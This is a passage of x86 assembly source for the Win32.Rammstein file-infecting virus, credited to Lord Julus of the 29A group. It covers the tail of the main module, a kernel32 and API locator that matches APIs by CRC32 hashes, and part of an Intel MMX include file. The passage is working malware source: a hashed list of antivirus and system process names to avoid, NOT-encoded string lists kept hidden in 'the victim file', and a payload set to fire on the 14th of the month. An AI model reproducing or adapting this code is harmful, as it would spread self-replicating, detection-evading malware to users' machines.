    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
text_end:                                          ;
list_len = $-offset text_start                     ;
                                                   ;
wc               STD_WINDOW   <size STD_WINDOW,0,0,0,0,0,0,0,0,0,0,0>
wintime          dd 4000                           ;
hInst            dd 0                              ;
hAccel           dd 0                              ;
htimer           dd 0                              ;
ourhIcon         dd 0                              ;
newhwnd          dd 0                              ;
msg              MSGSTRUCT <?>                     ;
r                RECT <?>                          ;
lppaint          PAINTSTRUCT <?>                   ;
textmetric       TEXTMETRIC <?>                    ;
xmax             dd 0                              ;
ymax             dd 0                              ;
xlength          dd 0                              ;
ylength          dd 0                              ;
xpos             dd 0                              ;
ypos             dd 0                              ;
current          dd 0                              ;
hdc              dd 0                              ;
chars            dd "Z"-"A"+2 dup (0)              ;
szTitleName      db 'Win32.Rammstein', 0           ;
szClassName      db 'RAMMSTEIN', 0                 ;
                                                   ;
DefaultStyle  = WS_OVERLAPPED+WS_VISIBLE           ;
ExtendedStyle = WS_EX_TOPMOST                      ;
                                                   ;
;==================================================;=========================
                                                   ;
ValidateFile:                                      ;
; ESI = pointer to filename                        ;
ret
       pusha                                       ;
       lea eax, [ebp+VF_ExceptionExit]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
                                                   ;
       call [ebp+_lstrlen], esi                    ;get the filename length
       cmp eax, 256                                ;is it too big?
       ja invalid_file                             ;
       mov ecx, eax                                ;
                                                   ;
       push ecx                                    ;uppercase the name
       call [ebp+_CharUpperBuffA], esi, ecx        ;
       pop ecx                                     ;
                                                   ;
       @endsz                                      ;go to it's end
       inc ecx                                     ;
       std                                         ;
       mov edi, esi                                ;and look backwards for
       mov al,'\'                                  ;the '\'
       repnz scasb                                 ;
       mov esi, edi                                ;
       or ecx, ecx                                 ;
       jz no_increase                              ;
       inc esi                                     ;if we found one, point it
       inc esi                                     ;
                                                   ;
no_increase:                                       ;
       cld                                         ;restore direction
       lea edi, [ebp+offset avoid_list]            ;our avoid list
                                                   ;
search_next:                                       ;
       cmp byte ptr [edi], 0FFh                    ;last entry?
       je all_names_ok                             ;
       xor ebx, ebx                                ;
       mov bl, [edi+4]                             ;get the name length
       xor ecx, ecx                                ;
       xchg byte ptr [esi+ebx], cl                 ;limit our string to the
       push esi                                    ;length with a 0
       call StringCRC32                            ;and compute a crc32 for
       pop esi                                     ;the piece...
       xchg byte ptr [esi+ebx], cl                 ;restore filename
       cmp eax, [edi]                              ;does it match?
       je av_name_found                            ;
       add edi, 5                                  ;get next...
       jmp search_next                             ;
                                                   ;
av_name_found:                                     ;
invalid_file:                                      ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       popa                                        ;
       stc                                         ;
       ret                                         ;
                                                   ;
all_names_ok:                                      ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       popa                                        ;
       clc                                         ;
       ret                                         ;
                                                   ;
 VF_ExceptionExit:                                 ;if we had an error we
        mov esp, [esp+8]                           ;must restore the ESP
        call DeltaRecoverVF                        ;
 DeltaRecoverVF:                                   ;
        pop ebp                                    ;
        sub ebp, offset DeltaRecoverVF             ;
        jmp invalid_file                           ;
                                                   ;
avoid_list:                                        ;
       crc32 <AV>                                 ;
       db 3                                        ;
       crc32 <_AV>                                 ;the list with filenames
       db 3                                        ;to avoid
       crc32 <ALERT>                               ;
       db 5                                        ;
       crc32 <AMON>                                ;
       db 4                                        ;
       crc32 <N32>                                 ;
       db 3                                        ;
       crc32 <NOD>                                 ;
       db 3                                        ;
       crc32 <NPSSVC>                              ;
       db 6                                        ;
       crc32 <NSCHEDNT>                            ;
       db 8                                        ;
       crc32 <NSPLUGIN>                            ;
       db 8                                        ;
       crc32 <TB>                                  ;
       db 2                                        ;
       crc32 <F->                                  ;
       db 2                                        ;
       crc32 <AW>                                  ;
       db 2                                        ;
       crc32 <AV>                                  ;
       db 2                                        ;
       crc32 <NAV>                                 ;
       db 3                                        ;
       crc32 <PAV>                                 ;
       db 3                                        ;
       crc32 <RAV>                                 ;
       db 3                                        ;
       crc32 <NVC>                                 ;
       db 3                                        ;
       crc32 <FPR>                                 ;
       db 3                                        ;
       crc32 <DSS>                                 ;
       db 3                                        ;
       crc32 <IBM>                                 ;
       db 3                                        ;
       crc32 <INOC>                                ;
       db 3                                        ;
       crc32 <ANTI>                                ;
       db 3                                        ;
       crc32 <SCN>                                 ;
       db 3                                        ;
       crc32 <SCAN>                                ;
       db 4                                        ;
       crc32 <VSAF>                                ;
       db 3                                        ;
       crc32 <VSWP>                                ;
       db 3                                        ;
       crc32 <PANDA>                               ;
       db 3                                        ;
       crc32 <DRWEB>                               ;
       db 3                                        ;
       crc32 <FSAV>                                ;
       db 3                                        ;
       crc32 <SPIDER>                              ;
       db 3                                        ;
       crc32 <ADINF>                               ;
       db 3                                        ;
       crc32 <EXPLORER>                            ;
       db 8                                        ;
       crc32 <SONIQUE>                             ;
       db 7                                        ;
       crc32 <SQSTART>                             ;
       db 7                                        ;
       crc32 <SMSS>                                ;
       db 4                                        ;
       crc32 <OUTLOOK>                             ;
       db 7                                        ;
       crc32 <PSTORES>                             ;
       db 7                                        ;
       db 0FFh                                     ;
                                                   ;
                                                   ;
not_list proc                                      ;
____1: cmp [ebp+copying], 1                        ;syncronization
       je ____1                                    ;
       mov [ebp+in_list], 1                        ;
       push esi edi                                ;this NOTs a list
       mov edi, esi                                ;
not_byte:                                          ;
       lodsb                                       ;
       not al                                      ;
       stosb                                       ;
       loop not_byte                               ;
       pop edi esi                                 ;
       mov [ebp+in_list], 0                        ;
       ret                                         ;
not_list endp                                      ;
in_list db 0                                       ;
                                                   ;
brandom32 proc                                     ;this bounds eax
       push edx                                    ;between 0 and eax-1
       push ecx                                    ;on random basis
       mov edx, 0                                  ;
       push eax                                    ;
       call random32                               ;
       pop ecx                                     ;
       div ecx                                     ;
       xchg eax, edx                               ;
       pop ecx                                     ;
       pop edx                                     ;
       ret                                         ;
brandom32 endp                                     ;
                                                   ;
random32 proc                                      ;this is a random nr
       push edx                                    ;generator. It's a
       call [ebp+_GetTickCount]                    ;modified version of
       rcl eax, 2                                  ;some random gen I found
       add eax, 12345678h                          ;someday and it had
random_seed = dword ptr $-4                        ;some flaws I fixed...
       adc eax, esp                                ;
       xor eax, ecx                                ;
       xor [ebp+random_seed], eax                  ;
       add eax, [esp-8]                            ;
       rcl eax, 1                                  ;
       pop edx                                     ;
       ret                                         ;
random32 endp                                      ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
check_not proc                                     ;
       pusha                                       ;Be sure not to let
       lea esi, [ebp+list_of_lists]                ;some of the lists
                                                   ;un-NOTed in the
get_another:                                       ;victim file
       lodsd                                       ;
       or eax, eax                                 ;
       jz correct                                  ;
       add eax, [ebp+finaldestination]             ;
       cmp byte ptr [eax], NOT "L"                 ;
       je no_problem                               ;
       call wrong                                  ;
                                                   ;
no_problem:                                        ;
       add esi, 4                                  ;
       jmp get_another                             ;
                                                   ;
correct:                                           ;
       popa                                        ;
       ret                                         ;
                                                   ;
wrong:                                             ;
       pusha                                       ;
       push eax                                    ;
       lodsd                                       ;
       pop esi                                     ;
       mov ecx, eax                                ;
       call not_list                               ;
       popa                                        ;
       ret                                         ;
check_not endp                                     ;
                                                   ;
list_of_lists label                                ;
              dd offset direct_list - offset start, direct_list_len
              dd offset file_extensions - offset start, file_extensions_len
              dd offset av_list - offset start, av_list_len
              dd 0                                 ;
                                                   ;
KillThread:                                        ;
       IF VIRUSNOTIFYEXIT                          ;
       push 0                                      ;
       call exittext1                              ;
       db 'Rammstein viral code end!', 0           ;
exittext1:                                         ;
       call exittext2                              ;
       db 'Rammstein viral code end!', 0           ;
exittext2:                                         ;
       push 0                                      ;
       call [ebp+_MessageBoxA]                     ;
       ENDIF                                       ;

       IF PAYLOAD                                  ;
       lea eax, [ebp+time]                         ;
       call [ebp+_GetSystemTime], eax              ;
       lea edi, [ebp+time]                         ;
       cmp word ptr [edi.ST_wDay], 14d             ;
       jne no_payload                              ;
       call DoPayload                              ;
                                                   ;
no_payload:                                        ;
       ENDIF                                       ;
                                                   ;
       IF MAINTHREADSEH                            ;
       jmp restore_main_seh                        ;host
                                                   ;
MainExceptionExit:                                 ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
                                                   ;
restore_main_seh:                                  ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;returning to the host...
                                                   ;
       call restore_delta                          ;
restore_delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset restore_delta               ;
                                                   ;
just_kill_it:                                      ;
       ENDIF
       mov eax, [ebp+_ExitThread]                  ;Exit the main thread
       push 0                                      ;
       call eax                                    ;

;
; Safe Copro. Thanx to Prizzy for pointing me that the copro cannot be shared
; in the same process and need to be saved to keep compatibility!

InitCopro:                                         ;
       sub esp, 128                                ;create space for copro
       fwait                                       ;data, wait for last to
       fnsave [esp]                                ;finish and save...
       finit                                       ;initialize copro
       jmp dword ptr [esp+80h]                     ;and return
                                                   ;
RestoreCopro:                                      ;
       fwait                                       ;wait to finish
       frstor [esp+4]                              ;restore copro data
       xchg eax, dword ptr [esp]                   ;now find out our return
       xchg eax, dword ptr [esp+80h]               ;address without altering
       xchg eax, dword ptr [esp]                   ;eax, kill the copro space
       add esp, 128                                ;on the stack. One Dword
       ret                                         ;remains on the stack
                                                   ;
EPO_Routine:                                       ;
       clc                                         ;
       ret                                         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
; Data area                                        ;
test_semaphore dd 0                                ;
W32FD          WIN32_FIND_DATA <?>                 ;
time           SYSTEMTIME <0>                      ;
memory         dd 0                                ;
free_routine   dd AVAILABLE                        ;
version        db 0                                ;
newsize        dd 0                                ;
newraw         dd 0                                ;
situation      dd 0                                ;
DeltaRVA       dd 0                                ;
mainthreadid   dd 0                                ;
headersum      dd 0                                ;
checksumfile   dd 0                                ;
lowest_section_raw dd 0                            ;
apihookfinish  dd 0                                ;
tempcounter    dd 0                                ;
fileopen       dd 0                                ;
Semaphore      db "Win32.Rammstein", 0             ;
saved_code     dd 0, 0                             ;
mmx            dd 0                                ;
skipper        db 0                                ;
no_imports     db 0                                ;
totalsizes     dd 0                                ;
smallest_dir_va dd 0                               ;
netapis        dd 0                                ;
ok             dd 0
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
include get_apis.inc                               ;included files
include rammdata.inc                               ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
virussize = end-start                              ;
copyright db 'Win32.Rammstein.'                    ;
          db virussize/10000 mod 10 + '0'          ;
          db virussize/01000 mod 10 + '0'          ;
          db virussize/00100 mod 10 + '0'          ;
          db virussize/00010 mod 10 + '0'          ;
          db virussize/00001 mod 10 + '0'          ;
          db ' v4.0', 10,13                        ;
          db '(c) Lord Julus - 2000 / [29A]',10,13 ;
MainThread endp                                    ;
end2:                                              ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
IF DEBUG                                           ;
   debug_end db 'Here is the end of the virus.',0  ;
ENDIF                                              ;
end label                                          ;
end start                                          ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[RAMM.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[GET_APIS.ASM]ƒƒƒ
; Locating modules and their exported api addresses routines
;
; Deluxe V2.0 ;-)
;
; (C) Lord Julus / [29A]
;
; This includes the jp/lapse/vecna crc32 macro calculator and the api
; getter is modified to search for the crc32 instead of names. Saves space
; and makes it harder to detect.

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€ Locate Kernel32 base address                                           €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
;
; Entry:  EAX = dword on stack at startup
;         EDX = pointer to kernel32 name
;
; Return: EAX = base address of kernel32 if success
;         EAX = 0, CF set if fail

LocateKernel32 proc near
       pushad                                      ; save all registers
       call @800                                   ; ...I don't know why I
@800:  pop ebx                                     ; had to do this this way,
       add ebx, delta3-@800+1                      ; but it wouldn't work
       mov dword ptr [ebx], ebp                    ; otherwise...
                                                   ;
       lea ebx, [ebp+try_method_2_error]           ; first set up a seh
       push ebx                                    ; frame so that if our
       push dword ptr fs:[0]                       ; first method crashes
       mov fs:[0], esp                             ; we will find ourselves
                                                   ; in the second method
locateloop:                                        ;
       cmp dword ptr [eax+0b4h], eax               ; first method looks for
       je found_k32_kill_seh                       ; the k32 by checking for
       dec eax                                     ; the equal dword at 0b4
       cmp eax, 40000000h                          ;
       jbe try_method_2                            ;
       jmp locateloop                              ;
                                                   ;
found_k32_kill_seh:                                ; if we found it, then we
       pop dword ptr fs:[0]                        ; must destroy the temp
       add esp, 4                                  ; seh frame
       mov [esp.pop_eax], eax                      ;
       jmp found_k32                               ;
                                                   ;
try_method_2_error:                                ; if the first method gave
        mov esp, [esp+8]                           ; and exception error we
delta3: mov ebp, 12345678h                         ; restore the stack and
                                                   ; the delta handle
try_method_2:                                      ;
       pop dword ptr fs:[0]                        ; restore the seh state
       add esp, 4                                  ;
       popad                                       ; restore registers and
       pushad                                      ; save them again
                                                   ; and go on w/ method two
       lea esi, [ebp+offset getmodulehandle]       ;
       mov ecx, getmodulehandlelen                 ;
       call not_list                               ;
                                                   ;
       mov ebx, dword ptr [ebp+imagebase]          ; now put imagebase in ebx
       mov esi, ebx                                ;
       cmp word ptr [esi], 'ZM'                    ; check if it is an EXE
       jne notfound_k32                            ;
       mov esi, dword ptr [esi.MZ_lfanew]          ; get pointer to PE
       cmp esi, 1000h                              ; too far away?
       jae notfound_k32                            ;
       add esi, ebx                                ;
       cmp word ptr [esi], 'EP'                    ; is it a PE?
       jne notfound_k32                            ;
       add esi, IMAGE_FILE_HEADER_SIZE             ; skip header
       mov edi, dword ptr [esi.OH_DataDirectory.DE_Import.DD_VirtualAddress]
       add edi, ebx                                ; and get import RVA
       mov ecx, dword ptr [esi.OH_DataDirectory.DE_Import.DD_Size]
       add ecx, edi                                ; and import size
       mov eax, edi                                ; save RVA
                                                   ;
locateloop2:                                       ;
       mov edi, dword ptr [edi.ID_Name]            ; get the name
       add edi, ebx                                ;
       xor dword ptr [edi], 'ˆ'                 ;
       cmp dword ptr [edi], 'NREK' xor 'ˆ'      ; and compare to KERN
       xor dword ptr [edi], 'ˆ'                 ;
       je found_the_kernel_import                  ; if it is not that one
       add eax, IMAGE_IMPORT_DESCRIPTOR_SIZE       ; skip to the next desc.
       mov edi, eax                                ;
       cmp edi, ecx                                ; but not beyond the size
       jae notfound_k32                            ; of the descriptor
       jmp locateloop2                             ;
                                                   ;
found_the_kernel_import:                           ; if we found the kernel
       mov edi, eax                                ; import descriptor
       mov esi, dword ptr [edi.ID_FirstThunk]      ; take the pointer to
       add esi, ebx                                ; addresses
       mov edi, dword ptr [edi.ID_Characteristics] ; and the pointer to
       add edi, ebx                                ; names
                                                   ;
gha_locate_loop:                                   ;
       push edi                                    ; save pointer to names
       mov edi, dword ptr [edi.TD_AddressOfData]   ; go to the actual thunk
       add edi, ebx                                ;
       add edi, 2                                  ; and skip the hint
                                                   ;
       push edi esi                                ; save these
       lea esi, dword ptr [ebp+getmodulehandle]    ; and point the name of
       mov ecx, getmodulehandlelen                 ; GetModuleHandleA
       rep cmpsb                                   ; see if it is that one
       je found_getmodulehandle                    ; if so...
       pop esi edi                                 ; otherwise restore
                                                   ;
       pop edi                                     ; restore arrays indexes
       add edi, 4                                  ; and skip to next
       add esi, 4                                  ;
       cmp dword ptr [esi], 0                      ; 0? -> end of import
       je notfound_k32                             ;
       jmp gha_locate_loop                         ;
                                                   ;
found_getmodulehandle:                             ;
       pop esi                                     ; restore stack
       pop edi                                     ;
       pop edi                                     ;
                                                   ;
       lea esi, [ebp+offset getmodulehandle]       ;
       mov ecx, getmodulehandlelen                 ;
       call not_list                               ;
                                                   ;
       push edx                                    ; push kernel32 name
       mov esi, [esi]                              ; esi = GetModuleHandleA
       call esi                                    ; address...
       mov [esp.pop_eax], eax                      ;
       or eax, eax                                 ;
       jz notfound_k32                             ;
                                                   ;
found_k32:                                         ;
       popad                                       ; restore all regs and
       clc                                         ; and mark success
       ret                                         ;
                                                   ;
notfound_k32:                                      ;
       popad                                       ; restore all regs
       xor eax, eax                                ; and mark the failure...
       stc                                         ;
       ret                                         ;
LocateKernel32 endp                                ;
@900 dd 0

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€ Locate Apis                                                            €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
;
; Entry:  EAX = base of module
;         ESI = pointer to API name crc32 array
;         EDX = pointer to array to receive API addresses
;         ECX = how many apis to import
;
; Return: EAX = 0, CF set if fail

LocateApis proc near                               ;
       pushad                                      ;
       mov [ebp+@901], ecx                         ;
                                                   ;
       push esi                                    ;
       push edx                                    ;
       mov ebx, eax                                ; save the module base
       mov edi, eax                                ;
       mov ax, word ptr [edi]                      ;
       xor ax, ''                                ;
       cmp ax, 'ZM' xor ''                       ; is it an exe?
       jne novalidmodule                           ;
                                                   ;
       mov edi, dword ptr [edi.MZ_lfanew]          ;
       cmp edi, 1000h                              ;
       jae novalidmodule                           ;
                                                   ;
       add edi, ebx                                ;
       mov ax, word ptr [edi]                      ;
       xor ax, 'Ò'                                ;
       cmp ax, 'EP' xor 'Ò'                       ; is it a PE?
       jne novalidmodule                           ;
                                                   ;
       add edi, IMAGE_FILE_HEADER_SIZE             ; skip file header
                                                   ;
       mov edi, dword ptr [edi.OH_DataDirectory.DE_Export.DD_VirtualAddress]
       add edi, ebx                                ; and get export RVA
                                                   ;
       mov ecx, dword ptr [edi.ED_NumberOfNames]   ; save number of names
                                                   ; to look into
       mov esi, dword ptr [edi.ED_AddressOfNames]  ; get address of names
       add esi, ebx                                ; align to base rva
       mov [ebp+@903], edi                         ;
                                                   ;
       pop edx                                     ;
       pop edi                                     ;
                                                   ;
api_locate_loop:                                   ;
       push ecx esi                                ; save counter and addr.
                                                   ;
       push edi                                    ;
       mov edi, [esi]                              ; get one name address
       add edi, ebx                                ; and align it
                                                   ;
       mov esi, edi                                ;
       call StringCRC32                            ;
                                                   ;
       pop edi                                     ;
       push edi                                    ;
       xor ecx, ecx                                ;
                                                   ;
rep_cmp:                                           ;
      cmp dword ptr [edi], 0                       ;
      je continue_search                           ;
      cmp [edi], eax                               ;
      je apifound                                  ;
      inc ecx                                      ;
      add edi, 4                                   ;
      jmp rep_cmp                                  ;
                                                   ;
continue_search:                                   ;
       pop edi esi ecx                             ; restore them
                                                   ;
       add esi, 4                                  ; and get next name
       loop api_locate_loop                        ;
                                                   ;
novalidmodule:                                     ; we didn't find it...
       popad                                       ;
       xor eax, eax                                ; mark failure
       stc                                         ;
       ret                                         ;
                                                   ;
apifound:                                          ;
       mov [ebp+@904], ecx                         ;
       pop edi esi ecx                             ; ecx = how many did we
       push ecx esi                                ;
       push edi                                    ;
       mov edi, [ebp+@903]                         ;
       sub ecx, dword ptr [edi.ED_NumberOfNames]   ; we need the reminder
       neg ecx                                     ; of the search
       mov eax, dword ptr [edi.ED_AddressOfOrdinals]; get address of ordinals
       add eax, ebx                                ;
       shl ecx, 1                                  ; and look using the index
       add eax, ecx                                ;
       xor ecx, ecx                                ;
       mov cx, word ptr [eax]                      ; take the ordinal
       mov eax, dword ptr [edi.ED_AddressOfFunctions]; take address of funcs.
       add eax, ebx                                ;
       shl ecx, 2                                  ; we look in a dword array
       add eax, ecx                                ; go to the function addr
       mov eax, [eax]                              ; take it's address
       add eax, ebx                                ; and align it to base
       mov ecx, [ebp+@904]                         ;
       shl ecx, 2                                  ;
       mov [edx+ecx], eax                          ;
       dec [ebp+@901]                              ;
       cmp [ebp+@901], 0                           ;
       je all_done                                 ;
       jmp continue_search                         ;
                                                   ;
all_done:                                          ;
       add esp, 0Ch                                ;
       popad                                       ;
       clc                                         ;
       ret                                         ;
LocateApis endp                                    ;
@901 dd 0                                          ;
@903 dd 0                                          ;
@904 dd 0

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€ General module handle retriving routine                                €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
;
; Entry:  EDI = pointer to module name
;
; Return: EAX = module base address if success
;         EAX = 0, CF set if fail

LocateModuleBase proc near                         ;
       pushad                                      ; save regs
       push edi                                    ; push name
       call dword ptr [ebp+_LoadLibraryA]          ; call LoadLibraryA
       mov [esp.pop_eax], eax                      ;
       popad                                       ;
       or eax, eax                                 ;
       jz notfoundmodule                           ;
       clc                                         ; success
       ret                                         ;
                                                   ;
notfoundmodule:                                    ;
       stc                                         ; fail
       ret                                         ;
LocateModuleBase endp                              ;

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€ CRC32 computer for strings                                             €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€

StringCRC32 proc near
; Input :   ESI = address of 0 terminated string to calculate CRC32 for
; Output:   EAX = CRC32
; From Prizzy's Crypto the idea of a string dedicated CRC32er

       push edx                                    ;
       mov edx, mCRC32_init                        ;
                                                   ;
CRC32_next_byte:                                   ;
       lodsb                                       ;
       or al, al                                   ;
       jz CRC32_finish                             ;
       xor dl, al                                  ;
       mov al, 08h                                 ;
                                                   ;
CRC32_next_bit:                                    ;
       shr edx, 01h                                ;
       jnc CRC32_no_change                         ;
       xor edx, mCRC32                             ;
                                                   ;
CRC32_no_change:                                   ;
       dec al                                      ;
       jnz CRC32_next_bit                          ;
       jmp CRC32_next_byte                         ;
                                                   ;
CRC32_finish:                                      ;
       xchg eax, edx                               ;
       pop edx                                     ;
       ret                                         ;
StringCRC32 endp                                   ;
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[GET_APIS.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[MMX.INC]ƒƒƒ
;****************************************************************************
;*                                                                           *
;* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY     *
;* KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE       *
;* IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A PARTICULAR     *
;* PURPOSE.                                                                  *
;*                                                                           *
;*    Copyright (C) 1997  Intel Corporation.  All Rights Reserved.           *
;*                                                                           *
;****************************************************************************

MMWORD  TEXTEQU <DWORD>
opc_Rdpmc     = 033H
opc_Emms      = 077H
opc_Movd_ld   = 06EH
opc_Movd_st   = 07EH
opc_Movq_ld   = 06FH
opc_Movq_st   = 07FH
opc_Packssdw  = 06BH
opc_Packsswb  = 063H
opc_Packuswb  = 067H
opc_Paddb     = 0FCH
opc_Paddd     = 0FEH
opc_Paddsb    = 0ECH
opc_Paddsw    = 0EDH
opc_Paddusb   = 0DCH
opc_Paddusw   = 0DDH
opc_Paddw     = 0FDH
opc_Pand      = 0DBH
opc_Pandn     = 0DFH
opc_Pcmpeqb   = 074H
opc_Pcmpeqd   = 076H
opc_Pcmpeqw   = 075H
opc_Pcmpgtb   = 064H
opc_Pcmpgtd   = 066H
opc_Pcmpgtw   = 065H
opc_Pmaddwd   = 0F5H
opc_Pmulhw    = 0E5H
opc_Pmullw    = 0D5H
opc_Por       = 0EBH
opc_PSHimd    = 072H
opc_PSHimq    = 073H
opc_PSHimw    = 071H
opc_Pslld     = 0F2H
opc_Psllq     = 0F3H
opc_Psllw     = 0F1H
opc_Psrad     = 0E2H
opc_Psraw     = 0E1H
opc_Psrld     = 0D2H
opc_Psrlq     = 0D3H
opc_Psrlw     = 0D1H
opc_Psubb     = 0F8H
opc_Psubd     = 0FAH
opc_Psubsb    = 0E8H
opc_Psubsw    = 0E9H
opc_Psubusb   = 0D8H
opc_Psubusw   = 0D9H
opc_Psubw     = 0F9H
opc_Punpcklbw = 060H
opc_Punpckldq = 062H
opc_Punpcklwd = 061H
opc_Punpckhbw = 068H
opc_Punpckhdq = 06AH
opc_Punpckhwd = 069H
opc_Pxor      = 0EFH

.486P


; ALIAS R# to MM# registers

DefineMMxRegs Macro
IFDEF APP_16BIT
        MM0     TEXTEQU <AX>
        MM1     TEXTEQU <CX>
        MM2     TEXTEQU <DX>
        MM3     TEXTEQU <BX>
        MM4     TEXTEQU <SP>
        MM5     TEXTEQU <BP>
        MM6     TEXTEQU <SI>
        MM7     TEXTEQU <DI>

        mm0     TEXTEQU <AX>
        mm1     TEXTEQU <CX>
        mm2     TEXTEQU <DX>
        mm3     TEXTEQU <BX>
        mm4     TEXTEQU <SP>
        mm5     TEXTEQU <BP>
        mm6     TEXTEQU <SI>
        mm7     TEXTEQU <DI>

        Mm0     TEXTEQU <AX>
        Mm1     TEXTEQU <CX>
        Mm2     TEXTEQU <DX>
        Mm3     TEXTEQU <BX>
        Mm4     TEXTEQU <SP>
        Mm5     TEXTEQU <BP>
        Mm6     TEXTEQU <SI>
        Mm7     TEXTEQU <DI>

        mM0     TEXTEQU <AX>
        mM1     TEXTEQU <CX>
        mM2     TEXTEQU <DX>
